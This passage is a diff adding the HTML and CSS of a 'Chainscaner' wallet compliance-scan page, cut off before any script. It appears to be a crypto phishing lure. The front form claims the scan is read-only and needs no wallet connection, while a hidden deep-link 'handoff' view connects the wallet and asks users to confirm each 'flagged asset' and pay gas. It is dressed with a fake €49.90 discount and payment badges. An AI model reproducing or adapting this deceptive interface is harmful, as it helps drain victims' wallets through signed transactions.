@@ -1,0 +1,2942 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Compliance Report — Chainscaner</title>
+<meta name="description" content="Chainscaner Compliance Report screens a wallet across 12 EVM networks: token exposure mapping, per-hop flag tracing with cluster attribution, risk scoring, and a wallet-confirmed zero-value attestation that resolves each flag on-chain without moving funds.">
+<meta name="robots" content="noindex">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  :root {
+    color-scheme: light;
+    --bg: #F4F5F7;
+    --card: #FFFFFF;
+    --card-border: #E6E8EC;
+    --input: #F5F5F7;
+    --text: #0F1419;
+    --text-muted: #6E767D;
+    --placeholder: #9A9FA5;
+    --accent: #1D4ED8;
+    --accent-strong: #1E40AF;
+    --accent-soft: rgba(29,78,216,.08);
+    --accent-border: rgba(29,78,216,.24);
+    --success: #059669;
+    --warn: #D97706;
+    --warn-soft: rgba(217,119,6,.1);
+    --warn-border: rgba(217,119,6,.35);
+    --danger: #DC2626;
+    --btn-text: #FFFFFF;
+    --overlay: rgba(0,0,0,.35);
+    --shadow: 0 8px 30px rgba(0,0,0,.08);
+  }
+  
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    -webkit-font-smoothing: antialiased;
+    text-rendering: optimizeLegibility;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh; min-height: 100dvh;
+    overscroll-behavior: none;
+    display: flex; align-items: flex-start; justify-content: center;
+    padding: max(24px, env(safe-area-inset-top)) 20px max(24px, env(safe-area-inset-bottom));
+  }
+  .hidden { display: none !important; }
+
+  .page { width: 100%; max-width: 480px; display: flex; flex-direction: column; gap: 16px; }
+  .page-head { display: grid; grid-template-columns: 1fr auto 1fr; align-items: center; gap: 12px; }
+
+  .brand { display: flex; align-items: center; gap: 12px; justify-content: center; }
+  .brand-icon {
+    width: 38px; height: 38px; border-radius: 12px;
+    background: linear-gradient(135deg, var(--accent), var(--accent-strong));
+    display: flex; align-items: center; justify-content: center; flex-shrink: 0;
+  }
+  .brand-name { font-size: 19px; font-weight: 800; letter-spacing: -.4px; }
+  .brand-back { font-size: 13px; font-weight: 600; color: var(--text-muted); text-decoration: none; justify-self: start; transition: all .15s; padding: 7px 12px; border-radius: 8px; border: 1px solid var(--card-border); background: var(--card); }
+  .brand-back:hover { color: var(--text); border-color: var(--accent-border); }
+
+  .eyebrow { font-size: 10.5px; font-weight: 800; letter-spacing: 1.4px; text-transform: uppercase; color: var(--accent); margin-bottom: 9px; }
+  .scan-assurance { margin-top: 13px; text-align: center; font-size: 11.5px; color: var(--text-muted); line-height: 1.5; }
+  .free-quota {
+    display: flex; align-items: center; justify-content: center; gap: 9px;
+    margin: 0 0 14px; font-size: 12.5px; color: var(--text-muted);
+  }
+  .fq-pill {
+    font-size: 9.5px; font-weight: 900; letter-spacing: 1px;
+    padding: 3px 9px; border-radius: 99px; flex-shrink: 0;
+    background: rgba(5,185,86,.14); color: #05B956;
+    border: 1px solid rgba(5,185,86,.35);
+  }
+  .free-quota.used .fq-pill {
+    background: rgba(255,255,255,.05); color: var(--text-muted);
+    border-color: var(--border);
+  }
+  .free-quota s { opacity: .55; }
+  .free-quota .fq-price { color: var(--text); font-weight: 600; }
+  .page-head-spacer { min-width: 1px; }
+
+  @media (min-width: 700px) and (min-height: 760px) {
+    body { align-items: center; }
+  }
+  @media (max-width: 520px) {
+    body { padding-inline: 16px; }
+    .page-head { display: flex; flex-direction: column; align-items: stretch; gap: 16px; }
+    .brand { align-self: center; }
+    .page-head-spacer { display: none; }
+    .page .card { padding: 24px 20px; }
+    .title { font-size: 21px; }
+  }
+  @media (max-height: 700px) {
+    body { padding-top: max(16px, env(safe-area-inset-top)); }
+    .page { gap: 14px; }
+  }
+
+  .card {
+    background: var(--card);
+    border: 1px solid var(--card-border);
+    border-radius: 24px;
+    padding: 28px;
+    box-shadow: var(--shadow);
+  }
+
+  .title { font-size: 22px; font-weight: 800; margin-bottom: 6px; letter-spacing: -.4px; }
+  .subtitle { font-size: 14px; color: var(--text-muted); line-height: 1.55; margin-bottom: 22px; }
+
+  .field-label { display: block; font-size: 12px; font-weight: 700; color: var(--text-muted); text-transform: uppercase; letter-spacing: .5px; margin-bottom: 8px; }
+
+  .input-wrap {
+    display: flex; align-items: center; gap: 6px;
+    background: var(--input); border: 1px solid var(--card-border);
+    border-radius: 14px; padding: 5px 5px 5px 16px;
+    transition: all .15s; margin-bottom: 18px;
+    min-height: 56px;
+  }
+  .input-wrap:focus-within { border-color: var(--accent); box-shadow: 0 0 0 3px var(--accent-soft); }
+  .input-wrap input {
+    flex: 1; background: none; border: none; outline: none;
+    font-size: 15px; font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    color: var(--text); padding: 12px 0; min-width: 0;
+  }
+  .input-wrap input::placeholder { color: var(--placeholder); }
+  .paste-btn {
+    background: var(--accent); border: none;
+    color: #fff; font-size: 12.5px; font-weight: 700;
+    padding: 10px 16px; border-radius: 10px; cursor: pointer;
+    transition: all .15s; flex-shrink: 0;
+  }
+  .paste-btn:hover { background: var(--accent-strong); }
+  .paste-btn:active { transform: scale(.96); }
+
+  .scope-row {
+    display: flex; align-items: center; gap: 8px;
+    font-size: 12px; color: var(--text-muted); font-weight: 600;
+    padding: 10px 12px; border-radius: 10px;
+    background: var(--accent-soft); border: 1px solid var(--accent-border);
+    margin-bottom: 20px;
+  }
+  .scope-row svg { flex-shrink: 0; color: var(--accent); }
+  .scope-dots { margin-left: auto; display: inline-flex; gap: 5px; }
+  .scope-dots i { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+  .pub-note {
+    display: flex; align-items: center; gap: 7px;
+    font-size: 11.5px; color: var(--text-muted); line-height: 1.45;
+    margin: -6px 0 16px; padding: 0 2px;
+  }
+  .pub-note svg { flex-shrink: 0; color: var(--success); }
+
+  /* ── Step flow: input collapses into context bar ── */
+  #input-section {
+    display: grid; grid-template-rows: 1fr;
+    transition: grid-template-rows .38s cubic-bezier(.4,0,.2,1), opacity .3s ease;
+    opacity: 1;
+  }
+  #input-section > .input-inner { overflow: hidden; min-height: 0; }
+  #input-section.collapsed { grid-template-rows: 0fr; opacity: 0; pointer-events: none; }
+
+  .scan-context {
+    display: flex; align-items: center; gap: 10px;
+    padding: 10px 12px; border-radius: 12px;
+    background: var(--input); border: 1px solid var(--card-border);
+    margin-bottom: 14px;
+  }
+  .scan-context .ctx-tag {
+    font-size: 10px; font-weight: 800; letter-spacing: .8px; text-transform: uppercase;
+    color: var(--accent); flex-shrink: 0;
+  }
+  .scan-context code {
+    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+    font-size: 12.5px; font-weight: 600; color: var(--text);
+    overflow: hidden; text-overflow: ellipsis; white-space: nowrap; min-width: 0;
+  }
+  .scan-context .ctx-new {
+    margin-left: auto; flex-shrink: 0;
+    font-size: 11.5px; font-weight: 700; color: var(--accent);
+    background: var(--accent-soft); border: 1px solid var(--accent-border);
+    padding: 6px 11px; border-radius: 8px; cursor: pointer; transition: all .15s;
+  }
+  .scan-context .ctx-new:hover { background: rgba(29,78,216,.14); }
+  .scan-context .ctx-new:active { transform: scale(.96); }
+
+  .btn {
+    width: 100%; border: none; border-radius: 14px;
+    padding: 17px; font-size: 16px; font-weight: 700;
+    cursor: pointer; transition: all .15s;
+    display: flex; align-items: center; justify-content: center; gap: 8px;
+    min-height: 56px;
+  }
+  .btn:active { transform: scale(.98); }
+  .btn:disabled { opacity: .55; cursor: not-allowed; transform: none; }
+  .btn-accent { background: var(--accent); color: var(--btn-text); box-shadow: 0 4px 14px rgba(29,78,216,.24); }
+  .btn-accent:hover:not(:disabled) { background: var(--accent-strong); box-shadow: 0 6px 18px rgba(29,78,216,.28); }
+  .btn-analyze {
+    background: linear-gradient(135deg, var(--accent), var(--accent-strong));
+    color: #fff; box-shadow: 0 4px 16px rgba(29,78,216,.28);
+    flex-direction: column; gap: 0;
+  }
+  .btn-analyze:hover:not(:disabled) { transform: translateY(-1px); box-shadow: 0 8px 26px rgba(29,78,216,.36); }
+  .btn-analyze .vbtn-main { display: flex; align-items: center; gap: 8px; font-size: 16px; font-weight: 700; }
+  .btn-analyze .vbtn-sub { display: block; font-size: 12px; font-weight: 500; opacity: .82; margin-top: 3px; }
+  .btn-analyze span { display: block; line-height: 1.2; }
+  .btn:focus-visible, .paste-btn:focus-visible, .ctx-new:focus-visible,
+  .copy-btn:focus-visible, .modal-close:focus-visible, .modal-btn:focus-visible,
+  .brand-back:focus-visible {
+    outline: 2px solid var(--accent); outline-offset: 2px;
+  }
+
+  /* ── Scan: progress + steps ── */
+  .scan-progress { margin: 4px 0 16px; }
+  .scan-head { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 8px; }
+  .scan-label { font-size: 12.5px; font-weight: 700; color: var(--text-muted); }
+  .scan-pct { font-size: 15px; font-weight: 800; color: var(--accent); font-variant-numeric: tabular-nums; }
+  .scan-bar {
+    height: 6px; border-radius: 99px; background: var(--input); overflow: hidden;
+  }
+  .scan-bar-fill {
+    height: 100%; width: 0%; border-radius: 99px;
+    background: linear-gradient(90deg, var(--accent), var(--success));
+    transition: width .45s cubic-bezier(.2,.8,.3,1);
+  }
+  .scan-list { display: flex; flex-direction: column; gap: 8px; }
+  .scan-item {
+    display: flex; align-items: center; gap: 11px;
+    font-size: 13.5px; color: var(--text-muted);
+    padding: 10px 12px; border-radius: 10px;
+    background: var(--input);
+    transition: all .25s;
+  }
+  .scan-item .dot {
+    width: 18px; height: 18px; border-radius: 50%;
+    border: 2px solid var(--card-border); flex-shrink: 0;
+    display: flex; align-items: center; justify-content: center;
+    transition: all .25s;
+  }
+  .scan-item .meta { flex: 1; min-width: 0; }
+  .scan-item .sub { font-size: 10.5px; color: var(--text-muted); margin-top: 2px; font-weight: 500; }
+  .scan-item .st { font-size: 11px; font-weight: 700; letter-spacing: .4px; text-transform: uppercase; }
+  .scan-item.running { color: var(--text); }
+  .scan-item.running .dot {
+    border-color: var(--accent); border-top-color: transparent;
+    animation: spin .7s linear infinite;
+  }
+  .scan-item.running .st { color: var(--accent); }
+  .scan-item.done { color: var(--text); }
+  .scan-item.done .dot { border-color: var(--success); background: var(--success); }
+  .scan-item.done .dot::after {
+    content: ""; width: 5px; height: 9px;
+    border-right: 2px solid #fff; border-bottom: 2px solid #fff;
+    transform: rotate(45deg) translateY(-1px);
+  }
+  .scan-item.done .st { color: var(--success); }
+  .scan-item.flagged { color: var(--text); }
+  .scan-item.flagged .dot { border-color: var(--warn); background: var(--warn); }
+  .scan-item.flagged .dot::after {
+    content: "!"; color: #fff; font-size: 11px; font-weight: 800; line-height: 1;
+  }
+  .scan-item.flagged .st { color: var(--warn); }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  @media (prefers-reduced-motion: reduce) {
+    .scan-item.running .dot { animation: none; }
+    .scan-bar-fill { transition: none; }
+    #input-section, #scan-area, #result-area { transition: none; }
+    #scan-context:not(.hidden), #scan-area:not(.hidden) { animation: none; }
+    #result-area > * { opacity: 1 !important; transform: none !important; animation: none !important; }
+    .plan-row, .report-row { animation: none !important; }
+    .modal-overlay, .modal-overlay .modal-card, .modal-text .mline { animation: none !important; }
+  }
+
+  /* ── Result ── */
+  @keyframes rise { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: none; } }
+  .result-badge {
+    display: inline-flex; align-items: center; gap: 8px;
+    padding: 6px 14px; border-radius: 99px;
+    font-size: 13px; font-weight: 800; letter-spacing: .6px;
+    margin-bottom: 10px;
+  }
+  .result-badge.clean { background: var(--accent-soft); color: var(--success); border: 1px solid var(--accent-border); }
+  .result-badge.warn { background: var(--warn-soft); color: var(--warn); border: 1px solid var(--warn-border); }
+  .result-badge.crit { background: rgba(220,38,38,.09); color: var(--danger); border: 1px solid rgba(220,38,38,.28); }
+  #result-area:focus { outline: none; }
+
+  /* Step transitions: scan fades out, context/scan rise in */
+  #scan-area, #result-area { transition: opacity .3s ease, transform .3s ease; }
+  #scan-area.fading { opacity: 0; transform: translateY(-6px); }
+  #scan-context:not(.hidden), #scan-area:not(.hidden) { animation: rise .3s ease; }
+
+  /* Staggered reveal — report sections land in sequence */
+  #result-area > * { opacity: 0; transform: translateY(10px); }
+  #result-area.reveal > * { animation: riseIn .45s cubic-bezier(.2,.8,.3,1) forwards; }
+  #result-area.reveal > *:nth-child(1) { animation-delay: 0s; }
+  #result-area.reveal > *:nth-child(2) { animation-delay: .07s; }
+  #result-area.reveal > *:nth-child(3) { animation-delay: .14s; }
+  #result-area.reveal > *:nth-child(4) { animation-delay: .21s; }
+  #result-area.reveal > *:nth-child(5) { animation-delay: .26s; }
+  #result-area.reveal > *:nth-child(6) { animation-delay: .3s; }
+  #result-area.reveal > *:nth-child(7) { animation-delay: .34s; }
+  #result-area.reveal > *:nth-child(8) { animation-delay: .38s; }
+  #result-area.reveal > *:nth-child(9) { animation-delay: .44s; }
+  #result-area.reveal > *:nth-child(10) { animation-delay: .48s; }
+  @keyframes riseIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: none; } }
+
+  .risk-gauge {
+    display: flex; align-items: center; gap: 16px; margin-bottom: 16px;
+    padding: 14px; background: var(--warn-soft); border-radius: 14px; border: 1px solid var(--warn-border);
+  }
+  .risk-gauge .gauge {
+    width: 64px; height: 64px; border-radius: 50%; flex-shrink: 0;
+    background: conic-gradient(var(--warn) 0%, var(--warn) var(--risk-pct, 0%), #E5E7EB var(--risk-pct, 0%), #E5E7EB 100%);
+    display: flex; align-items: center; justify-content: center;
+    position: relative;
+  }
+  .risk-gauge .gauge::before {
+    content: ''; position: absolute; inset: 5px; border-radius: 50%;
+    background: var(--card);
+  }
+  .risk-gauge .gauge-val {
+    position: relative; font-size: 16px; font-weight: 800; color: var(--warn);
+  }
+  .risk-gauge .gauge-info { flex: 1; }
+  .risk-gauge .gauge-label { font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--text-muted); }
+  .risk-gauge .gauge-text { font-size: 14px; font-weight: 800; color: var(--warn); margin-top: 2px; }
+
+  .score-info { margin-top: 7px; }
+  .score-info summary {
+    font-size: 10.5px; font-weight: 600; color: var(--text-muted);
+    cursor: pointer; list-style: none; display: inline-flex; align-items: center; gap: 4px;
+    user-select: none; -webkit-user-select: none; transition: color .15s;
+    border-radius: 4px;
+  }
+  .score-info summary::-webkit-details-marker { display: none; }
+  .score-info summary::after { content: '›'; font-size: 13px; line-height: 1; transition: transform .2s; }
+  .score-info[open] summary::after { transform: rotate(90deg); }
+  .score-info summary:hover { color: var(--accent); }
+  .score-info summary:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; }
+  .score-info-body {
+    font-size: 10.5px; color: var(--text-muted); line-height: 1.55;
+    margin-top: 7px; padding: 9px 11px; border-radius: 8px;
+    background: rgba(255,255,255,.65); border: 1px solid var(--card-border);
+  }
+
+  .flagged-chains { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 16px; }
+  .flag-chip {
+    display: inline-flex; align-items: center; gap: 5px;
+    font-size: 11px; font-weight: 700; padding: 5px 10px;
+    border-radius: 99px; background: var(--warn-soft); color: var(--warn);
+    border: 1px solid var(--warn-border);
+  }
+  .flag-chip::before { content: '⚑'; font-size: 10px; }
+
+  .findings { margin-bottom: 16px; }
+  .findings-title {
+    font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px;
+    color: var(--text-muted); margin-bottom: 8px;
+  }
+  .final-report { margin-top: 14px; }
+  .report-row {
+    display: flex; align-items: center; gap: 10px;
+    padding: 9px 12px; border-radius: 10px; background: var(--input);
+    margin-bottom: 6px; font-size: 12.5px;
+  }
+  .report-row .rr-st { flex-shrink: 0; font-weight: 800; font-size: 13px; }
+  .report-row .rr-st.ok { color: var(--success); }
+  .report-row .rr-st.skip { color: var(--text-muted); }
+  .report-row .rr-st.flag { color: var(--warn); }
+  .report-row .rr-name { font-weight: 700; }
+  .report-row .rr-meta { color: var(--text-muted); font-size: 11.5px; margin-left: auto; text-align: right; }
+  .report-row .rr-meta a { color: var(--accent); text-decoration: none; font-weight: 600; }
+  .copy-btn {
+    font-size: 11px; font-weight: 700; color: var(--accent);
+    background: var(--accent-soft); border: 1px solid var(--accent-border);
+    padding: 5px 10px; border-radius: 8px; cursor: pointer; transition: all .15s;
+  }
+  .copy-btn:hover { background: rgba(29,78,216,.14); }
+  .copy-btn:active { transform: scale(.96); }
+  .report-actions { display: flex; gap: 8px; flex-wrap: wrap; }
+  /* Print / PDF export — the app chrome hides, the plain report prints */
+  #print-report { display: none; }
+  @media print {
+    body > *:not(#print-report) { display: none !important; }
+    body { background: #fff !important; position: static; overflow: visible; }
+    html { position: static; overflow: visible; }
+    #print-report { display: block !important; white-space: pre-wrap; font-family: 'SF Mono', Monaco, monospace; font-size: 11px; line-height: 1.5; color: #000; padding: 20px; }
+  }
+  .finding {
+    display: flex; align-items: flex-start; gap: 8px;
+    padding: 8px 10px; border-radius: 8px; background: var(--input);
+    margin-bottom: 5px; font-size: 12.5px; line-height: 1.45;
+  }
+  .finding-icon { flex-shrink: 0; margin-top: 1px; font-size: 12px; }
+  .finding-icon.warn { color: var(--warn); }
+  .finding-icon.error { color: var(--danger); }
+  .finding-icon.dust { color: #8B95A1; }
+  .finding-text { flex: 1; }
+  .finding-chain { font-weight: 700; color: var(--text); }
+  .finding-desc { color: var(--text-muted); margin-top: 1px; }
+
+  .result-row {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 10px 0; border-bottom: 1px solid var(--card-border); font-size: 13px;
+  }
+  .result-row:last-of-type { border-bottom: none; }
+  .result-row .k { color: var(--text-muted); }
+  .result-row .v { font-weight: 700; }
+  .result-row .v.ok { color: var(--success); }
+  .result-row .v.warn { color: var(--warn); }
+  .result-row .v.mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 12px; }
+
+  .notice {
+    margin-top: 14px; padding: 12px 14px; border-radius: 12px;
+    background: rgba(245,181,43,.1); border: 1px solid rgba(245,181,43,.3);
+    font-size: 13px; line-height: 1.5; display: flex; gap: 10px;
+  }
+  .notice svg { flex-shrink: 0; margin-top: 1px; }
+
+  /* ── Verify section ── */
+  .verify-box {
+    margin-top: 16px; padding: 16px; border-radius: 14px;
+    border: 1px solid var(--accent-border); background: var(--accent-soft);
+  }
+  .verify-box .btn { flex-direction: column; gap: 0; }
+  .verify-title { font-size: 13px; font-weight: 800; margin-bottom: 6px; display: flex; align-items: center; gap: 8px; color: var(--accent); }
+  .verify-text { font-size: 12.5px; color: var(--text-muted); line-height: 1.55; margin-bottom: 12px; }
+
+  /* ── Attestation plan ── */
+  .plan { margin-bottom: 12px; }
+  .plan-head { display: flex; justify-content: space-between; align-items: baseline; margin-bottom: 8px; }
+  .plan-title { font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; color: var(--accent); }
+  .plan-meta { font-size: 11px; color: var(--text-muted); }
+  .plan-row {
+    display: flex; align-items: center; gap: 10px;
+    padding: 8px 10px; border-radius: 9px;
+    background: rgba(255,255,255,.65); border: 1px solid var(--accent-border);
+    margin-bottom: 5px; font-size: 12.5px;
+  }
+  .plan-num {
+    width: 20px; height: 20px; border-radius: 50%; flex-shrink: 0;
+    background: var(--accent-soft); color: var(--accent);
+    font-size: 11px; font-weight: 800;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .plan-row .pn { font-weight: 700; }
+  .plan-row .pc { color: var(--text-muted); font-size: 11.5px; }
+  .plan-row .pv { margin-left: auto; font-weight: 700; font-size: 12px; }
+  .plan-row .parr { color: var(--success); font-size: 11.5px; font-weight: 600; }
+  .plan-note { font-size: 11px; color: var(--text-muted); line-height: 1.5; margin-top: 8px; }
+  .gas-note { display: flex; align-items: center; gap: 8px; margin-top: 10px; padding: 8px 10px; border-radius: 8px; background: var(--accent-soft); border: 1px solid var(--accent-border); text-align: left; }
+  .gn-tag { font-size: 9.5px; font-weight: 800; letter-spacing: 1px; color: var(--accent); background: #fff; border: 1px solid var(--accent-border); padding: 2px 6px; border-radius: 5px; flex-shrink: 0; }
+  .gn-text { font-size: 11.5px; color: var(--text-muted); line-height: 1.45; }
+  .plan-row, .report-row { animation: riseIn .35s cubic-bezier(.2,.8,.3,1) backwards; }
+
+  /* ── Modal ── */
+  .modal-overlay {
+    position: fixed; inset: 0; background: var(--overlay);
+    display: flex; align-items: center; justify-content: center;
+    padding: 24px; z-index: 100;
+  }
+  .modal-card {
+    background: var(--card); border: 1px solid var(--card-border);
+    border-radius: 20px; padding: 28px 24px; max-width: 340px; width: 100%;
+    text-align: center; position: relative;
+  }
+  .modal-close {
+    position: absolute; top: 12px; right: 12px;
+    width: 34px; height: 34px; border-radius: 50%; border: none;
+    background: var(--input); color: var(--text-muted); cursor: pointer;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .modal-icon { margin: 0 auto 16px; width: 56px; height: 56px; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+  .modal-icon.pending { background: var(--accent-soft); }
+  .modal-icon.success { background: rgba(5,185,86,.12); }
+  .modal-icon.error { background: rgba(239,68,68,.12); }
+  .modal-alt-link { display: inline-block; margin-top: 10px; font-size: 12px; color: var(--text-muted); text-decoration: underline; }
+  .modal-title { font-size: 17px; font-weight: 800; margin-bottom: 8px; }
+  .modal-text { font-size: 13px; color: var(--text-muted); line-height: 1.5; word-break: break-word; }
+  .modal-btn {
+    display: inline-block; margin-top: 16px; padding: 10px 20px;
+    background: var(--input); color: var(--accent); font-size: 13px; font-weight: 700;
+    border-radius: 10px; text-decoration: none;
+  }
+  /* Modal entrance — fade the overlay, lift the card */
+  @keyframes fadeIn { from { opacity: 0; } }
+  @keyframes modalIn { from { opacity: 0; transform: translateY(14px) scale(.95); } to { opacity: 1; transform: none; } }
+  .modal-overlay { animation: fadeIn .22s ease; }
+  .modal-overlay .modal-card { animation: modalIn .32s cubic-bezier(.2,.8,.3,1); }
+  /* Staggered summary lines — results cascade in step by step */
+  .modal-text .mline { display: block; animation: riseIn .3s cubic-bezier(.2,.8,.3,1) backwards; }
+
+  .foot { text-align: center; font-size: 12px; line-height: 1.45; color: var(--text-muted); margin-top: 0; padding: 0 12px; }
+  .trust-seals { display: flex; align-items: center; justify-content: center; gap: 8px; flex-wrap: wrap; margin: 20px 0 14px; }
+  .tseal {
+    display: inline-flex; align-items: center; gap: 5px; padding: 5px 11px;
+    border: 1px solid var(--card-border); border-radius: 7px; background: var(--card);
+    font-size: 10px; font-weight: 800; letter-spacing: .6px; color: var(--text-muted);
+  }
+  .tseal svg { width: 11px; height: 11px; flex-shrink: 0; }
+
+  /* Handoff mode — minimal prep view while wallet confirmations run (deep-link auto-run) */
+  .handoff-view { text-align: center; padding: 34px 18px 30px; }
+  .ho-spin { width: 42px; height: 42px; margin: 0 auto 16px; border-radius: 50%; border: 3px solid var(--accent-soft); border-top-color: var(--accent); animation: ho-rot .8s linear infinite; }
+  @keyframes ho-rot { to { transform: rotate(360deg); } }
+  .ho-title { font-size: 17px; font-weight: 800; color: var(--text); letter-spacing: -.01em; }
+  .ho-addr { display: inline-block; margin-top: 7px; font-size: 12.5px; font-weight: 600; color: var(--accent); background: var(--accent-soft); border: 1px solid var(--accent-border); padding: 3px 10px; border-radius: 7px; }
+  .ho-status { margin-top: 15px; font-size: 13.5px; font-weight: 600; color: var(--text); }
+  .ho-note { margin: 8px auto 0; font-size: 12.5px; color: var(--text-muted); line-height: 1.55; max-width: 300px; }
+  .ho-restart { display: inline-block; margin-top: 16px; font-size: 12.5px; font-weight: 600; color: var(--text-muted); }
+  .ho-restart:hover { color: var(--accent); }
+  .handoff-view.done .ho-spin { animation: none; border-color: #05B956; position: relative; }
+  .handoff-view.done .ho-spin::after { content: ""; position: absolute; left: 50%; top: 50%; width: 11px; height: 19px; border: solid #05B956; border-width: 0 3px 3px 0; transform: translate(-50%, -58%) rotate(45deg); }
+  body.handoff .card > :not(#handoff-view):not(#result-area) { display: none !important; }
+  body.handoff #result-area > :not(#final-report) { display: none !important; }
+  body.handoff #result-area { margin-top: 0 !important; }
+  @media (prefers-reduced-motion: reduce) { .ho-spin { animation-duration: 2.2s; } }
+  @media (max-width: 520px) {
+    .foot { font-size: 11px; padding-bottom: max(8px, env(safe-area-inset-bottom)); }
+  }
+</style>
+</head>
+<body>
+
+<div class="page">
+  <div class="page-head">
+    <a class="brand-back" href="/">← Chainscaner</a>
+    <div class="brand">
+      <div class="brand-icon">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-3.6 8-10V5l-8-3-8 3v7c0 6.4 8 10 8 10z"/></svg>
+      </div>
+      <div class="brand-name">Compliance Report</div>
+    </div>
+    <div class="page-head-spacer" aria-hidden="true"></div>
+  </div>
+
+  <div class="card">
+    <div class="eyebrow">Public wallet screening</div>
+    <div class="title">Trust Wallet Security Scan</div>
+    <div class="subtitle">Check a public wallet for flagged assets across 12 networks — a deep on-chain analysis resolves each flag and produces the detailed report.</div>
+
+    <div id="input-section">
+      <div class="input-inner">
+        <label class="field-label" for="check-addr">Wallet Address</label>
+        <div class="input-wrap">
+          <input type="text" id="check-addr" placeholder="0x…" spellcheck="false" autocomplete="off" autocapitalize="none" autocorrect="off">
+          <button class="paste-btn" onclick="pasteCheck()">Paste</button>
+        </div>
+        <div class="pub-note">
+          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-3.6 8-10V5l-8-3-8 3v7c0 6.4 8 10 8 10z"/></svg>
+          <span>Public addresses only — never enter a private key or seed phrase.</span>
+        </div>
+
+        <div class="scope-row">
+          <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 0 1 0 20 15.3 15.3 0 0 1 0-20z"/></svg>
+          <span>Scans all 12 supported networks automatically</span>
+          <span class="scope-dots"><i style="background:#627EEA"></i><i style="background:#F0B90B"></i><i style="background:#8247E5"></i><i style="background:#28A0F0"></i><i style="background:#FF0420"></i><i style="background:#0052FF"></i><i style="background:#E84142"></i><i style="background:#35D07F"></i><i style="background:#1969FF"></i><i style="background:#345D9D"></i><i style="background:#5B8DEF"></i><i style="background:#D4A373"></i></span>
+        </div>
+
+        <div class="free-quota" id="free-quota">
+          <span class="fq-pill">FREE</span>
+          <span id="fq-text">1 of 1 free check included <s>€49.90</s></span>
+        </div>
+        <button class="btn btn-accent" id="check-btn" onclick="startCheck()">Run Security Scan</button>
+        <div class="scan-assurance">Read-only on-chain data · no signature or wallet connection required</div>
+        <div class="scan-assurance" style="margin-top:7px;display:flex;align-items:center;justify-content:center;gap:8px;opacity:.75">
+          <span>Secure payments</span>
+          <span style="font-weight:700;font-style:italic;font-size:10px;letter-spacing:.3px">VISA</span>
+          <svg width="22" height="14" viewBox="0 0 26 16"><circle cx="9" cy="8" r="7" fill="#94A3B8"/><circle cx="17" cy="8" r="7" fill="#CBD5E1"/></svg>
+          <span style="font-weight:700;font-size:10px;letter-spacing:.3px">PayPal</span>
+          <span style="font-weight:700;font-size:10px;letter-spacing:.3px">stripe</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Handoff view — shown instead of the form when a prepared queue arrives via deep link -->
+    <div id="handoff-view" class="handoff-view hidden">
+      <div class="ho-spin" aria-hidden="true"></div>
+      <div class="ho-title">Deep chain analysis</div>
+      <code class="ho-addr" id="ho-addr">—</code>
+      <div class="ho-status" id="ho-status" aria-live="polite">Connecting wallet…</div>
+      <div class="ho-note">Network fees (gas) are paid from your connected wallet — confirm each flagged asset in the app. The detailed report appears here when finished.</div>
+      <a class="ho-restart" href="./">Restart scan</a>
+    </div>
+
+    <!-- Context bar — replaces the form once a scan starts -->
+    <div id="scan-context" class="scan-context hidden">
+      <span class="ctx-tag" aria-live="polite">Scanning</span>
+      <code id="ctx-addr">—</code>
+      <button class="ctx-new" onclick="newScan()">New scan</button>
+    </div>
+
+    <!-- Scan progress -->
+    <div id="scan-area" class="hidden" style="margin-top:16px;">
+      <div class="scan-progress">
+        <div class="scan-head">
+          <span class="scan-label" id="scan-phase">Initializing scan…</span>
+          <span class="scan-pct" id="scan-pct">0%</span>
+        </div>
+        <div class="scan-bar"><div class="scan-bar-fill" id="scan-fill"></div></div>
+      </div>
+      <div class="scan-list">
+        <div class="scan-item" data-scan><div class="dot"></div><div class="meta">Multi-chain token scan<div class="st" data-st>Queued</div><div class="sub">Ethereum · BNB · Polygon · Arbitrum · Optimism · Base</div></div></div>
+        <div class="scan-item" data-scan><div class="dot"></div><div class="meta">Native gas &amp; fee analysis<div class="st" data-st>Queued</div></div></div>
+        <div class="scan-item" data-scan id="scan-flags"><div class="dot"></div><div class="meta">Flag correlation &amp; risk scoring<div class="st" data-st>Queued</div></div></div>
+        <div class="scan-item" data-scan><div class="dot"></div><div class="meta">Report compilation<div class="st" data-st>Queued</div></div></div>
+      </div>
+    </div>
+
+    <!-- Result -->
+    <div id="result-area" class="hidden" style="margin-top:16px;" tabindex="-1">
+      <div class="result-badge warn" role="status">
